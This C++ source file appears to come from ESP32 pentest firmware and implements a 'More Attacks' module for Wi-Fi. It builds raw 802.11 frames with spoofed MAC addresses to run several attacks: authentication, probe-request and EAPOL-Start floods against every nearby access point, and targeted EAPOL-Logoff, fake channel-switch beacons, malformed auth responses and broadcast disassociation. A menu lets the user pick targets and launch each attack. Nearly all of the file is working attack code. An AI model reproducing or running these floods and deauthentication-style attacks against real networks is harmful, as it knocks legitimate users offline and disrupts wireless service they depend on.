#include "more_atks.h"

#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "wifi_atks.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

extern bool showHiddenNetworks;

// ============================================================================
// Frame builders
//
// Every builder writes into a caller-supplied buffer and returns the frame
// length. Sequence numbers come from a file-local counter so consecutive frames
// do not look identical to the receiver.
// ============================================================================

static uint16_t moreSeq = 0;

static void moreWriteSeq(uint8_t *frame, size_t offset) {
    moreSeq = (moreSeq + 1) & 0x0FFF;
    // 802.11 sequence control: 4 bits fragment (0) then 12 bits sequence.
    frame[offset] = (uint8_t)((moreSeq << 4) & 0xF0);
    frame[offset + 1] = (uint8_t)((moreSeq >> 4) & 0xFF);
}

static void moreRandomMac(uint8_t *mac) {
    mac[0] = (uint8_t)((random(0, 256) & 0xFE) | 0x02); // locally administered, unicast
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
}

static const uint8_t moreBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/// Random printable SSID, 5..24 characters.
static String moreRandomSSID() {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = random(5, 25);
    String s;
    for (int i = 0; i < len; i++) s += charset[random(0, (int)sizeof(charset) - 1)];
    return s;
}

/// IEEE 802.11 probe request (subtype 4).
static size_t moreBuildProbeReq(uint8_t *f, const uint8_t *sa, const String &ssid) {
    size_t n = 0;
    f[n++] = 0x40; // frame control: management, probe request
    f[n++] = 0x00;
    f[n++] = 0x00; // duration
    f[n++] = 0x00;
    memcpy(&f[n], moreBroadcast, 6);
    n += 6; // addr1 = DA (broadcast)
    memcpy(&f[n], sa, 6);
    n += 6; // addr2 = SA
    memcpy(&f[n], moreBroadcast, 6);
    n += 6;      // addr3 = BSSID (broadcast)
    moreWriteSeq(f, n);
    n += 2;

    size_t ssidLen = ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    f[n++] = 0x00; // SSID element
    f[n++] = (uint8_t)ssidLen;
    if (ssidLen) {
        memcpy(&f[n], ssid.c_str(), ssidLen);
        n += ssidLen;
    }

    static const uint8_t rates[] = {0x01, 0x04, 0x82, 0x84, 0x8B, 0x96};
    memcpy(&f[n], rates, sizeof(rates));
    n += sizeof(rates);
    return n;
}

/// IEEE 802.11 authentication frame (subtype 11). `algorithm` 0 = open system;
/// an unknown algorithm is what the "bad message" path uses.
static size_t moreBuildAuth(
    uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *bssid, uint16_t algorithm, uint16_t status
) {
    size_t n = 0;
    f[n++] = 0xB0;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], sa, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = (uint8_t)(algorithm & 0xFF);
    f[n++] = (uint8_t)(algorithm >> 8);
    f[n++] = 0x01; // authentication transaction sequence: 1
    f[n++] = 0x00;
    f[n++] = (uint8_t)(status & 0xFF);
    f[n++] = (uint8_t)(status >> 8);
    return n;
}

/// IEEE 802.11 association response (subtype 1) with a failure status code.
static size_t moreBuildAssocResp(uint8_t *f, const uint8_t *da, const uint8_t *bssid, uint16_t status) {
    size_t n = 0;
    f[n++] = 0x10;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = 0x01; // capability: ESS
    f[n++] = 0x00;
    f[n++] = (uint8_t)(status & 0xFF);
    f[n++] = (uint8_t)(status >> 8);
    f[n++] = 0x01; // association id
    f[n++] = 0x00;
    return n;
}

/// IEEE 802.11 disassociation frame (subtype 10).
static size_t moreBuildDisassoc(
    uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *bssid, uint16_t reason
) {
    size_t n = 0;
    f[n++] = 0xA0;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], sa, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = (uint8_t)(reason & 0xFF);
    f[n++] = (uint8_t)(reason >> 8);
    return n;
}

/// 802.11 data frame carrying an EAPOL frame (LLC/SNAP 0x888E).
/// toDs true  = supplicant -> AP  (raf = bssid, ta = client)
/// toDs false = AP -> supplicant  (raf = client, ta = bssid, sa = client)
static size_t moreBuildEapol(uint8_t *f, const uint8_t *client, const uint8_t *bssid, uint8_t eapolType, bool toDs) {
    size_t n = 0;
    f[n++] = 0x08;                        // frame control: data
    f[n++] = toDs ? 0x01 : 0x02;          // ... ToDS / FromDS
    f[n++] = 0x00;
    f[n++] = 0x00;
    if (toDs) {
        memcpy(&f[n], bssid, 6);
        n += 6; // addr1 = RA/BSSID
        memcpy(&f[n], client, 6);
        n += 6; // addr2 = TA/client
        memcpy(&f[n], bssid, 6);
        n += 6; // addr3 = SA/BSSID
    } else {
        memcpy(&f[n], client, 6);
        n += 6; // addr1 = DA/client
        memcpy(&f[n], bssid, 6);
        n += 6; // addr2 = TA/BSSID
        memcpy(&f[n], client, 6);
        n += 6; // addr3 = SA/client
    }
    moreWriteSeq(f, n);
    n += 2;

    static const uint8_t llcSnap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    memcpy(&f[n], llcSnap, sizeof(llcSnap));
    n += sizeof(llcSnap);

    f[n++] = 0x02;       // EAPOL version 2
    f[n++] = eapolType;  // 1 = Start, 2 = Logoff, 3 = Key
    f[n++] = 0x00;       // length 0
    f[n++] = 0x00;
    return n;
}

/// Beacon with a Channel Switch Announcement element (ID 37) so clients follow
/// the fake BSSID onto `newChannel`.
static size_t moreBuildCsaBeacon(
    uint8_t *f, const uint8_t *bssid, const String &ssid, uint8_t curChannel, uint8_t newChannel, uint8_t count
) {
    size_t n = 0;
    f[n++] = 0x80; // beacon
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], moreBroadcast, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;

    for (int i = 0; i < 8; i++) f[n++] = 0x00; // timestamp
    f[n++] = 0x64;                             // beacon interval 100
    f[n++] = 0x00;
    f[n++] = 0x01; // capability: ESS
    f[n++] = 0x00;

    size_t ssidLen = ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    f[n++] = 0x00;
    f[n++] = (uint8_t)ssidLen;
    if (ssidLen) {
        memcpy(&f[n], ssid.c_str(), ssidLen);
        n += ssidLen;
    }

    static const uint8_t rates[] = {0x01, 0x04, 0x82, 0x84, 0x8B, 0x96};
    memcpy(&f[n], rates, sizeof(rates));
    n += sizeof(rates);

    f[n++] = 0x03; // DS parameter set
    f[n++] = 0x01;
    f[n++] = curChannel;

    f[n++] = 0x25; // Channel Switch Announcement
    f[n++] = 0x03;
    f[n++] = 0x01; // mode: stop transmitting until the switch
    f[n++] = newChannel;
    f[n++] = count;
    return n;
}

/// Send one frame through the hardened raw-TX path. Returns frames accepted.
static uint32_t moreSend(const uint8_t *frame, size_t len, uint8_t channel, uint8_t repeat = 1) {
    WifiRawTxResult r = wifi_raw_inject(frame, len, channel, repeat, -1, false, 0);
    return r.ok ? (uint32_t)r.sent : 0;
}

// ============================================================================
// AP discovery
// ============================================================================

struct MoreAp {
    uint8_t bssid[6];
    uint8_t channel;
    String ssid;
};

static int moreScanAps(std::vector<MoreAp> &aps, int maxAps = 24) {
    aps.clear();
    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
    for (int i = 0; i < nets && (int)aps.size() < maxAps; i++) {
        uint8_t ch = (uint8_t)WiFi.channel(i);
        if (ch == 0) continue;
        MoreAp ap;
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.channel = ch;
        ap.ssid = WiFi.SSID(i);
        aps.push_back(ap);
    }
    WiFi.scanDelete();
    return (int)aps.size();
}

// Shared timing loop used by every attack.
static bool moreTimeLeft(uint32_t start, uint32_t durationMs) { return (int32_t)(start + durationMs - millis()) > 0; }

static void moreTick(uint32_t frames, uint32_t start, const MoreProgressFn &progress, uint32_t &lastTick) {
    uint32_t now = millis();
    if (progress && (now - lastTick) >= 250) {
        lastTick = now;
        progress(frames, now - start);
    }
}

// ============================================================================
// Flood attacks
// ============================================================================

MoreAtkResult more_auth_flood(uint32_t durationMs, const MoreProgressFn &progress) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    std::vector<MoreAp> aps;
    res.targets = moreScanAps(aps);
    if (res.targets == 0) {
        res.error = "no access points found";
        wifi_atk_unsetWifi();
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (const auto &ap : aps) {
            for (int i = 0; i < 8; i++) {
                uint8_t sa[6];
                moreRandomMac(sa);
                size_t len = moreBuildAuth(frame, ap.bssid, sa, ap.bssid, 0x0000, 0x0000);
                res.frames += moreSend(frame, len, ap.channel);
                if (EscPress) break;
            }
            if (EscPress) break;
            if (!moreTimeLeft(start, durationMs)) break;
        }
        moreTick(res.frames, start, progress, lastTick);
        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = aps.empty() ? 0 : aps[0].channel;
    res.detail = String(res.targets) + " APs";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_probe_flood(
    uint32_t durationMs, const String &ssid, bool randomSSID, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[96];
    uint8_t channel = 1;
    String lastSSID = ssid;

    while (moreTimeLeft(start, durationMs)) {
        String useSSID = (randomSSID || ssid.length() == 0) ? moreRandomSSID() : ssid;
        lastSSID = useSSID;
        for (int i = 0; i < 6; i++) {
            uint8_t sa[6];
            moreRandomMac(sa);
            size_t len = moreBuildProbeReq(frame, sa, useSSID);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (++channel > 13) channel = 1;
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.targets = 1;
    res.channel = channel;
    res.detail = randomSSID ? String("random SSIDs") : lastSSID;
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_eapol_start_flood(uint32_t durationMs, const MoreProgressFn &progress) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    std::vector<MoreAp> aps;
    res.targets = moreScanAps(aps);
    if (res.targets == 0) {
        res.error = "no access points found";
        wifi_atk_unsetWifi();
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (const auto &ap : aps) {
            for (int i = 0; i < 8; i++) {
                uint8_t client[6];
                moreRandomMac(client);
                // EAPOL-Start (type 1) from a spoofed supplicant to the AP.
                size_t len = moreBuildEapol(frame, client, ap.bssid, 0x01, true);
                res.frames += moreSend(frame, len, ap.channel);
                if (EscPress) break;
            }
            if (EscPress) break;
            if (!moreTimeLeft(start, durationMs)) break;
        }
        moreTick(res.frames, start, progress, lastTick);
        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = aps.empty() ? 0 : aps[0].channel;
    res.detail = String(res.targets) + " APs";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

// ============================================================================
// Targeted attacks
// ============================================================================

MoreAtkResult more_eapol_logoff(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        // Log off a handful of spoofed supplicants (broadcast is not valid for
        // EAPOL, so a spread of addresses is what covers the real clients).
        for (int i = 0; i < 16; i++) {
            uint8_t client[6];
            moreRandomMac(client);
            size_t len = moreBuildEapol(frame, client, bssid, 0x02, true);
            res.frames += moreSend(frame, len, channel, 3);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "EAPOL-Logoff";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_channel_switch(
    const uint8_t bssid[6], const char *ssid, uint8_t channel, uint8_t newChannel, uint32_t durationMs,
    const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;
    if (newChannel < 1 || newChannel > 14) newChannel = 14;
    if (newChannel == channel) newChannel = (channel == 14) ? 1 : (uint8_t)(channel + 1);

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    String useSSID = ssid ? String(ssid) : String("");
    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[160];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 4; i++) {
            size_t len = moreBuildCsaBeacon(frame, bssid, useSSID, channel, newChannel, 3);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = String("switch to ch ") + String(newChannel);
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_bad_message(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 16; i++) {
            uint8_t client[6];
            moreRandomMac(client);
            uint8_t variant = (uint8_t)random(0, 3);
            size_t len;
            if (variant == 0) {
                // Association response claiming the association failed.
                len = moreBuildAssocResp(frame, client, bssid, 0x0001);
            } else if (variant == 1) {
                // Authentication response with an algorithm the client never asked for.
                len = moreBuildAuth(frame, client, bssid, bssid, 0xFFFF, 0x0001);
            } else {
                // Authentication response with an out-of-sequence transaction id.
                len = moreBuildAuth(frame, client, bssid, bssid, 0x0000, 0x000D);
            }
            res.frames += moreSend(frame, len, channel, 2);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "malformed responses";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_auth_attack(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 24; i++) {
            uint8_t sa[6];
            moreRandomMac(sa);
            size_t len = moreBuildAuth(frame, bssid, sa, bssid, 0x0000, 0x0000);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "auth requests";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_disassoc_attack(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];
    static const uint16_t reasons[] = {0x0007, 0x0003, 0x0006, 0x0008};

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 32; i++) {
            // From the AP to every client (broadcast receiver).
            uint16_t reason = reasons[random(0, 4)];
            size_t len = moreBuildDisassoc(frame, moreBroadcast, bssid, bssid, reason);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "disassoc broadcast";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

// ============================================================================
// Shared helpers for the menu and the console
// ============================================================================

bool moreParseMac(const String &mac, uint8_t out[6]) {
    unsigned int v[6];
    if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) {
        if (v[i] > 0xFF) return false;
        out[i] = (uint8_t)v[i];
    }
    return true;
}

const char *moreTargetAtkName(int id) {
    switch (id) {
        case 0: return "EAPOL Logoff";
        case 1: return "Channel Switch";
        case 2: return "Bad Message";
        case 3: return "Authentication Attack";
        case 4: return "Disassociation Attack";
        default: return "Unknown";
    }
}

MoreAtkResult moreRunTargetAtk(
    int id, const String &ssid, const String &mac, uint8_t channel, uint8_t newChannel, uint32_t durationMs,
    const MoreProgressFn &progress
) {
    uint8_t bssid[6];
    if (!moreParseMac(mac, bssid)) {
        MoreAtkResult res;
        res.error = "invalid BSSID";
        return res;
    }
    switch (id) {
        case 0: return more_eapol_logoff(bssid, channel, durationMs, progress);
        case 1: return more_channel_switch(bssid, ssid.c_str(), channel, newChannel, durationMs, progress);
        case 2: return more_bad_message(bssid, channel, durationMs, progress);
        case 3: return more_auth_attack(bssid, channel, durationMs, progress);
        case 4: return more_disassoc_attack(bssid, channel, durationMs, progress);
        default: {
            MoreAtkResult res;
            res.error = "unknown attack";
            return res;
        }
    }
}

// ============================================================================
// On-device UI
// ============================================================================

/// Default run time for a menu-driven attack.
#define MORE_MENU_MS 15000

/// Drop presses that queued up while an attack was running, so the press that
/// dismisses a result screen cannot also fire on the menu rebuilt behind it.
static void moreClearPendingKeys() {
    EscPress = false;
    SelPress = false;
    PrevPress = false;
    NextPress = false;
    UpPress = false;
    DownPress = false;
    AnyKeyPress = false;
}

static void moreWaitAnyKey() {
    moreClearPendingKeys();
    while (!check(AnyKeyPress)) vTaskDelay(pdMS_TO_TICKS(20));
    moreClearPendingKeys();
}

static void moreStatusScreen(const String &title, const String &line1, const String &line2) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    if (line1.length()) tft.drawString(line1.substring(0, 34), 10, 45);
    if (line2.length()) tft.drawString(line2, 10, 63);
    tft.drawString("Press BACK to stop", 10, tftHeight - 20);
}

static void moreResultScreen(const String &title, const MoreAtkResult &r) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(r.ok ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
    tft.drawString(r.ok ? "Finished" : "Failed", 10, 42);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString(String("Frames: ") + String(r.frames), 10, 62);
    tft.drawString(String("Time: ") + String(r.seconds) + "s", 10, 80);
    tft.drawString(String("Targets: ") + String(r.targets), 10, 98);
    if (r.detail.length()) tft.drawString(r.detail.substring(0, 34), 10, 116);
    if (r.error) tft.drawString(String("Err: ") + r.error, 10, 134);
    tft.drawString("Press any key", 10, tftHeight - 20);
    moreWaitAnyKey();
}

/// Live counter painted by the attack loop through its progress callback.
static MoreProgressFn moreMenuProgress(const String &title, const String &target) {
    return [title, target](uint32_t frames, uint32_t elapsed) {
        drawMainBorderWithTitle(title);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.drawString(target.substring(0, 34), 10, 45);
        tft.drawString(String("Frames: ") + String(frames), 10, 63);
        tft.drawString(String("Time: ") + String(elapsed / 1000) + "s", 10, 81);
        tft.drawString("Press BACK to stop", 10, tftHeight - 20);
    };
}

static void moreRunTargetUi(int id, const String &ssid, const String &mac, uint8_t channel, uint8_t newChannel) {
    uint32_t t0 = millis();
    moreStatusScreen(moreTargetAtkName(id), ssid, String("Ch: ") + String(channel));
    MoreAtkResult r =
        moreRunTargetAtk(id, ssid, mac, channel, newChannel, MORE_MENU_MS, moreMenuProgress(moreTargetAtkName(id), mac));
    r.seconds = (millis() - t0) / 1000;
    moreResultScreen(moreTargetAtkName(id), r);
}

void moreTargetAtkMenu(const String &tssid, const String &mac, uint8_t channel) {
AGAIN:
    options = {
        {"EAPOL Logoff",
         [=]() {
             moreRunTargetUi(0, tssid, mac, channel, 0);
         }                                        },
        {"Channel Switch",
         [=]() {
             String ch = num_keyboard("11", 2, "New channel (1-14):");
             int newCh = ch.toInt();
             if (newCh < 1 || newCh > 14) newCh = 11;
             moreRunTargetUi(1, tssid, mac, channel, (uint8_t)newCh);
         }                                        },
        {"Bad Message",
         [=]() {
             moreRunTargetUi(2, tssid, mac, channel, 0);
         }                                        },
        {"Authentication Attack",
         [=]() {
             moreRunTargetUi(3, tssid, mac, channel, 0);
         }                                        },
        {"Disassociation Attack",
         [=]() {
             moreRunTargetUi(4, tssid, mac, channel, 0);
         }                                        },
        {"Info",
         [=]() {
             moreStatusScreen("Target", tssid, mac);
             moreWaitAnyKey();
         }                                        },
    };
    addOptionToMainMenu();
    int selected = loopOptions(options, MENU_TYPE_SUBMENU, "More Attacks");
    // Physical Back leaves the page instead of re-rendering it.
    if (selected < 0) return;
    if (returnToMenu) return; // "Main Menu" entry
    goto AGAIN;
}

void moreAtkMenu() {
AGAIN:
    options = {
        {"Auth Flood",
         [=]() {
             uint32_t t0 = millis();
             moreStatusScreen("Auth Flood", "all APs in range", "open-system auth frames");
             MoreAtkResult r = more_auth_flood(MORE_MENU_MS, moreMenuProgress("Auth Flood", "all APs"));
             r.seconds = (millis() - t0) / 1000;
             moreResultScreen("Auth Flood", r);
         }      },
        {"Probe Request",
         [=]() {
             uint32_t t0 = millis();
             moreStatusScreen("Probe Request", "random SSIDs", "all channels");
             MoreAtkResult r =
                 more_probe_flood(MORE_MENU_MS, "", true, moreMenuProgress("Probe Request", "random SSIDs"));
             r.seconds = (millis() - t0) / 1000;
             moreResultScreen("Probe Request", r);
         }      },
        {"EAPOL Attack",
         [=]() {
             uint32_t t0 = millis();
             moreStatusScreen("EAPOL Attack", "EAPOL-Start flood", "all APs in range");
             MoreAtkResult r = more_eapol_start_flood(MORE_MENU_MS, moreMenuProgress("EAPOL Attack", "all APs"));
             r.seconds = (millis() - t0) / 1000;
             moreResultScreen("EAPOL Attack", r);
         }      },
        {"Beacon Flood",
         [=]() {
             beaconAttack();
         }      },
        {"Target Attacks",
         [=]() {
             int nets = WiFi.scanNetworks(false, showHiddenNetworks);
             if (nets <= 0) {
                 displayError("No networks found", true);
                 return;
             }
             std::vector<Option> netOptions;
             for (int i = 0; i < nets && i < 24; i++) {
                 String ssid = WiFi.SSID(i);
                 if (ssid.length() == 0) ssid = "<hidden>";
                 String mac = WiFi.BSSIDstr(i);
                 uint8_t ch = (uint8_t)WiFi.channel(i);
                 String label = ssid + " (" + String(WiFi.RSSI(i)) + "|ch." + String(ch) + ")";
                 netOptions.push_back({label, [ssid, mac, ch]() { moreTargetAtkMenu(ssid, mac, ch); }});
             }
             netOptions.push_back({"Back", []() {}});
             int sel = loopOptions(netOptions, MENU_TYPE_SUBMENU, "Pick target");
             (void)sel;
             WiFi.scanDelete();
         }      },
    };
    addOptionToMainMenu();
    int selected = loopOptions(options, MENU_TYPE_SUBMENU, "More Attacks");
    // Physical Back leaves the page instead of re-rendering it.
    if (selected < 0) return;
    if (returnToMenu) return; // "Main Menu" entry
    goto AGAIN;
}
